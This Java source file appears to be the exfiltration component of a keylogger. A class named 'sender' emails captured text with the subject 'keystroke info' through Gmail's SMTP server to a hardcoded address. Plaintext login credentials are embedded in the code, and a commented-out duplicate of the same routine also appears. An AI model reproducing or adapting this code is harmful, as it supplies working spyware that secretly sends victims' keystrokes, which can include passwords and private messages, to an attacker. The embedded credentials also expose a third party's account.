package Manager;

import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.sound.midi.Receiver;
import java.util.Properties;
import static javax.mail.Message.*;

public class sender {
    private sender(){
    }
   /* private static final String SENDER_GMAIL= "akshayschumacher@gmail.com";//edit it for your email
    private static final String SENDER_PASSWORD= "fuckyou$";//edit it for you password
    private static final String RECEIVERS_EMAIL = "akshayschumacher@gmail.com";//edit it for your email
    private static Properties mailServerProperties;
    private static Session mailSess;
    private static MimeMessage mailMessage;

    public static void sendmail(String emailBody) throws Throwable{
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port","587");
        mailServerProperties.put("mail.smtp.auth","true");
        mailServerProperties.put("mail.smtp.starttls.enable","true");
        mailSess = Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSess);
        mailMessage.addRecipient(RecipientType.BCC,new InternetAddress(RECEIVERS_EMAIL));
        mailMessage.setSubject("keytroke info");
        mailMessage.setContent(emailBody,"text/html");
        Transport transport = mailSess.getTransport("smtp");
        transport.connect("smtp.gmail.com",SENDER_GMAIL,SENDER_PASSWORD);
        transport.sendMessage(mailMessage,mailMessage.getAllRecipients());
        transport.close();

    }*/

    private static final String  GMAIL="akshayschumacher@gmail.com";//edit it to yours email
    private static final String  Password = "fuckyou$";//edit it to your password  of the specified email
    private static final String  Receiver_email= "akshayschumacher@gmail.com";
    private static Properties mailServerProperties;
    private static Session mailSession;
    private static MimeMessage mailMessage;

    public static  void sendMail( String emailbody) throws Throwable{
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable","true" );

        mailSession = Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSession);
        mailMessage.addRecipient(RecipientType.BCC,new InternetAddress(Receiver_email));
        mailMessage.setSubject("keystroke info");
        mailMessage.setContent(emailbody, "text/html");

        Transport transport = mailSession.getTransport("smtp");
        transport.connect("smtp.gmail.com",GMAIL,Password);
        transport.sendMessage(mailMessage,mailMessage.getAllRecipients());
        transport.close();
    }




}
